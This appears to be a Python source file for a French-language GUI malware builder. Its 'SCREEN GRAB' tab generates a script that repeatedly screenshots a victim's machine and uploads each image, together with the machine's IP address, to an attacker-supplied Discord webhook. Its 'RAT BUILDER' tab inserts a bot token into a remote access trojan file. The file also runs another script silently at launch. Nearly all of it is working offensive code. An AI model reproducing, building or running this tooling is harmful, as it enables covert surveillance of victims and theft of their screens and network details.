import customtkinter
from customtkinter import *
import os
import webbrowser

os.system("python appmain.py")

def mode():
    if switch1.get():  
        set_appearance_mode("light")
    else: 
        set_appearance_mode("dark")

def screengrab():
    webhook_url = entry1.get()
    file_name = entry2.get()

    screen = f"""import pyautogui
import requests
import os
import time
import socket

hostname = socket.gethostname()

def capture_screenshot(filename="screenshot.png"):
    screenshot = pyautogui.screenshot()  
    screenshot.save(filename)  
    return filename

def send_to_discord_webhook(image_path, webhook_url):
    with open(image_path, "rb") as file:
        payload = {{
            'content': socket.gethostbyname(hostname) 
        }}
        files = {{
            'file': (os.path.basename(image_path), file, 'image/png')
        }}
        response = requests.post(webhook_url, data=payload, files=files)

WEBHOOK_URL = "{webhook_url}"

for _ in range(10):
    screenshot_path = capture_screenshot()
    send_to_discord_webhook(screenshot_path, WEBHOOK_URL)
    os.remove(screenshot_path) 
    time.sleep(3)"""
    os.makedirs('output', exist_ok=True)

    file_path = os.path.join('output', file_name)

    with open(file_path, "w") as fichier:
        fichier.write(screen)

def ratbuild():
    token = entry3.get()
    os.makedirs('output', exist_ok=True)

    file_path = os.path.join('output', 'rat.py')

    with open(file_path, "a") as fichier:
        fichier.write(f"\nbot.run('{token}')")

def discord():
    webbrowser.open("https://discord.gg/arkaz")

app = customtkinter.CTk()
app.geometry("600x300")

tabview = CTkTabview(master=app)
tabview.pack(padx=20, pady=20)

tabview.add("SCREEN GRAB")
tabview.add("RAT BUILDER")
tabview.add("INFO")

entry1 = CTkEntry(master=tabview.tab("SCREEN GRAB"), placeholder_text="WEBHOOK DISCORD")
entry1.pack(padx=20, pady=20)

entry2 = CTkEntry(master=tabview.tab("SCREEN GRAB"), placeholder_text="NOM DU FICHIER")
entry2.pack(padx=20, pady=20)

entry3 = CTkEntry(master=tabview.tab("RAT BUILDER"), placeholder_text="BOT TOKEN")
entry3.pack(padx=20, pady=20)

button1 = CTkButton(master=tabview.tab("SCREEN GRAB"), text="BUILD", command=screengrab)
button1.pack(padx=5, pady=5)

label1 = CTkLabel(master=tabview.tab("RAT BUILDER"), text="(Le token sera ajouter a rat.py)", fg_color="transparent")
label1.pack(padx=5, pady=5)

button2 = CTkButton(master=tabview.tab("RAT BUILDER"), text="BUILD",command=ratbuild)
button2.pack(padx=5, pady=5)

label2 = CTkLabel(
    master=tabview.tab("INFO"), 
    text="SCREEN LOGGER / L'APP / RAT (!beep/!fond -> zxk) \n crée par akr", 
    fg_color="transparent", 
    font=("Arial", 15, "bold"),  
    justify="center" 
)
label2.pack(padx=10, pady=10)


button3 = CTkButton(master=tabview.tab("INFO"), text="DISCORD", command=discord, width=60, height=30)
button3.pack(padx=5, pady=5)

switch1 = CTkSwitch(master=app, text="", command=mode)
switch1.place(relx=0.03, rely=0.03, anchor="nw")

app.mainloop()